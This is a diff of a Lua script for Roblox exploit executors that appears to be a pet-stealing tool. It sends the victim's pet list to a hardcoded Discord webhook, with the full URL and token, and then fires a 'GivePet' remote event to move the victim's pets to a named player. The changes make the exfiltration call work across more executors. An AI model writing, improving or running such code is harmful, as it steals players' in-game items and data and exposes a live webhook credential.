@@ -87,14 +87,19 @@ local data = {
         "\nPets: " .. (#petsList > 0 and table.concat(petsList, ", ") or "No Pets Found")
 }
 
-pcall(function()
-    request({
-        Url = "https://discord.com/api/webhooks/1396222326332199054/yeePfFQ3e73Q_uyRsznWW-PvRKYR_ST6CqymG-werQGIi3zWgyEZde4KMl7yi9WV3_-y",
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = HttpService:JSONEncode(data)
-    })
-end)
+local req = (syn and syn.request) or (http and http.request) or (http_request) or (request)
+if req then
+    pcall(function()
+        req({
+            Url = "https://discord.com/api/webhooks/1396222326332199054/yeePfFQ3e73Q_uyRsznWW-PvRKYR_ST6CqymG-werQGIi3zWgyEZde4KMl7yi9WV3_-y",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(data)
+        })
+    end)
+else
+    warn("⚠️ Webhook request not supported on this executor.")
+end
 
 -- Pet Transfer
 task.wait(3)
@@ -109,6 +114,7 @@ task.spawn(function()
                 if player.Name == name then
                     for _, pet in ipairs(petsToSend) do
                         pcall(function()
+                            print("🔁 Sending pet:", pet, "to", player.Name)
                             game:GetService("ReplicatedStorage").GivePet:FireServer(pet, player)
                         end)
                     end
